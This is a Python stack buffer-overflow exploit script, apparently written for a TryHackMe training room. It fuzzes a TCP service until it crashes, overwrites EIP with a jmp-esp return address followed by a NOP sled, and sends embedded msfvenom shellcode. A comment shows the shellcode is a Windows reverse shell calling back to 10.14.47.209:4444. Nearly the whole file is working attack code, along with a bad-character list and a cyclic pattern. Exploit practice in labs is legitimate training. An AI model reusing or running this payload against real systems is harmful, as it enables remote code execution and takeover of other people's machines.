##################################################
##@jockmedlinux @ 2023-01-08					##
##################################################
import os,sys,subprocess,socket,argparse,time
from struct import pack
parser = argparse.ArgumentParser(description='Easy script for buffer overflow by @jockemedlinux')
parser.add_argument('-F', action='store_true', help='Fuzz the application')
parser.add_argument('-B', action='store_true', help='Send the buffer')
parser.add_argument('-O', action='store_true', default='', help='Find the offset', required=False)
parser.add_argument('-C', action='store_true', default='', help='Check for bad characters', required=False)
parser.add_argument('-H', type=str, default='127.0.0.1', help='Host "IP"', required=False)
parser.add_argument('-P', type=int, default='1337', help='Port', required=False)

args = parser.parse_args()

# // fun stuff.
cowsending = subprocess.getoutput("echo 'Sending beezneez:::' | cowsay")
cowsent = subprocess.getoutput("echo ':::Beezneez sent' | cowsay")
cowfail	= subprocess.getoutput("echo 'Is it even running, guy?' | cowsay")
cowquit	= subprocess.getoutput("echo 'Quitter..' | cowsay -d")
cowprofit = subprocess.getoutput("echo 'Did we get it?' | cowsay -e '0o'")

def pattern_create(pattern):
	pattern_create = subprocess.getoutput("msf-pattern_create -l %s" % pattern)
	print(pattern_create)

def pattern_offset(offset):
	pattern_offset = subprocess.getoutput("msf-pattern_offset -q %s" % offset)
	print(pattern_offset)

timeout = 5

# // Tinker variables
prefix = "OVERFLOW8 "			#Special prefix for THM
offset = 1786					#Found offset
As = "A" * offset				#Overflow
Bs = "BBBB"						#EIP-control
retn = "\xAF\x11\x50\x62"		#return-address (jmp-esp or push-esp) Save input here. [ADDRESS:"625011AF" | LittleEndian: "\xAF\x11\x50\x62"]
nops = "\x90" * 16				#\x90
nullbyte = ""					#\x00

# // Cyclic brakepoint.[SAVE INPUT HERE| ADDRESS:"68433568" ]
cyclic = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2C"

badchars = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
#badchars = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfc\xfd\xfe\xff"


# // Malicious shellcode to run. (if not using buf as above)
#identified bad characters here --> [ \x00\x1d\x2e\xc7\xee ]

#msfvenom -p windows/shell_reverse_tcp LHOST=10.14.47.209 LPORT=4444 EXITFUNC=thread -b "\x00\x1d\x2e\xc7\xee" -f c
shellcode = ("\xbe\x4d\xe0\x83\x09\xdb\xcb\xd9\x74\x24\xf4\x58\x29\xc9"                                                          
"\xb1\x52\x31\x70\x12\x03\x70\x12\x83\x8d\xe4\x61\xfc\xf1"                                                          
"\x0d\xe7\xff\x09\xce\x88\x76\xec\xff\x88\xed\x65\xaf\x38"                                                          
"\x65\x2b\x5c\xb2\x2b\xdf\xd7\xb6\xe3\xd0\x50\x7c\xd2\xdf"                                                          
"\x61\x2d\x26\x7e\xe2\x2c\x7b\xa0\xdb\xfe\x8e\xa1\x1c\xe2"                                                          
"\x63\xf3\xf5\x68\xd1\xe3\x72\x24\xea\x88\xc9\xa8\x6a\x6d"                                                          
"\x99\xcb\x5b\x20\x91\x95\x7b\xc3\x76\xae\x35\xdb\x9b\x8b"                                                          
"\x8c\x50\x6f\x67\x0f\xb0\xa1\x88\xbc\xfd\x0d\x7b\xbc\x3a"                                                          
"\xa9\x64\xcb\x32\xc9\x19\xcc\x81\xb3\xc5\x59\x11\x13\x8d"                                                          
"\xfa\xfd\xa5\x42\x9c\x76\xa9\x2f\xea\xd0\xae\xae\x3f\x6b"                                                          
"\xca\x3b\xbe\xbb\x5a\x7f\xe5\x1f\x06\xdb\x84\x06\xe2\x8a"                                                          
"\xb9\x58\x4d\x72\x1c\x13\x60\x67\x2d\x7e\xed\x44\x1c\x80"                                                          
"\xed\xc2\x17\xf3\xdf\x4d\x8c\x9b\x53\x05\x0a\x5c\x93\x3c"                                                          
"\xea\xf2\x6a\xbf\x0b\xdb\xa8\xeb\x5b\x73\x18\x94\x37\x83"                                                          
"\xa5\x41\x97\xd3\x09\x3a\x58\x83\xe9\xea\x30\xc9\xe5\xd5"                                                          
"\x21\xf2\x2f\x7e\xcb\x09\xb8\x8b\x02\x3e\xe9\xe4\x18\x40"                                                          
"\x18\xa9\x95\xa6\x70\x41\xf0\x71\xed\xf8\x59\x09\x8c\x05"                                                          
"\x74\x74\x8e\x8e\x7b\x89\x41\x67\xf1\x99\x36\x87\x4c\xc3"                                                          
"\x91\x98\x7a\x6b\x7d\x0a\xe1\x6b\x08\x37\xbe\x3c\x5d\x89"
"\xb7\xa8\x73\xb0\x61\xce\x89\x24\x49\x4a\x56\x95\x54\x53"
"\x1b\xa1\x72\x43\xe5\x2a\x3f\x37\xb9\x7c\xe9\xe1\x7f\xd7"
"\x5b\x5b\xd6\x84\x35\x0b\xaf\xe6\x85\x4d\xb0\x22\x70\xb1"
"\x01\x9b\xc5\xce\xae\x4b\xc2\xb7\xd2\xeb\x2d\x62\x57\x0b"
"\xcc\xa6\xa2\xa4\x49\x23\x0f\xa9\x69\x9e\x4c\xd4\xe9\x2a"
"\x2d\x23\xf1\x5f\x28\x6f\xb5\x8c\x40\xe0\x50\xb2\xf7\x01"
"\x71")

# // THM Room specifics.
string = prefix + "A" * 100

# // The buffer
buffer = ""
buffer += prefix
buffer += As
#buffer += Bs
buffer += retn
buffer += nops
#buffer += cyclic
#buffer += badchars
buffer += shellcode

def close():
	print("\nProgram closing.")
	print(cowquit)
	sys.exit()

def crash():
	print(cowprofit)
	sys.exit()

def run():
	print(cowfail)
	sys.exit()
	lenght = int(input("How many characters do you wanna create? "))
	pattern = cyclic(lenght)
	print("\nCreated string: ")
	print(pattern.decode())
	print("\n")
	find = input("What is the input you wanna search for? ")
	offset = cyclic_find(str(find), n=len(pattern))
	print(offset)

#def badchars():

def fuzzer():
	global prefix
	global string
	while True:
		try:
			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
				#result = s.connect_ex((args.H, args.P))
				s.settimeout(timeout)
				s.connect((args.H, args.P))
				s.recv(1024)
				print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
				s.send(bytes(string, "latin-1"))
				s.recv(1024)
		except KeyboardInterrupt:
			close()
		except socket.gaierror as e:
			print(f'Error: {e}')
			run()
		except socket.error as e2:
			if len(string) - len(prefix) > 100:
				print(f'\nError:{e2}')
				print(f'You seem to have crashed it.')
				print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
				print("\nHere is an appropriate cyclic string:\n")
				pattern = (len(string) - len(prefix) + 100)
				pattern_create(pattern)
				crash()
			else:
				print(f'Error: {e2}')
				run()
		except:
			print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
			crash()
		string += 100 * "A"
		
# // Buffer overflow
def main():
	global buffer
	global cowsending
	print(cowsending)
	print(bytes(buffer, "latin-1"))
	try:
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
			s.settimeout(timeout)
			s.connect((args.H, args.P))
			s.recv(1024)
			s.send(bytes(buffer, "latin-1"))
			s.recv(1024)
	except KeyboardInterrupt:
		close()
	except:
		print(cowsent)

if args.F:
	fuzzer()
elif args.B:
	main()
#elif args.O:
#	offset()
#elif args.C:
	#badchars()
else:
	print("\033[1;31;40m \n##You need to use either the Fuzzer (-F) module, or the Buffer (-B) module##\n")
	print("\033[1;32;40m Bright Green \n")
	parser.print_help()	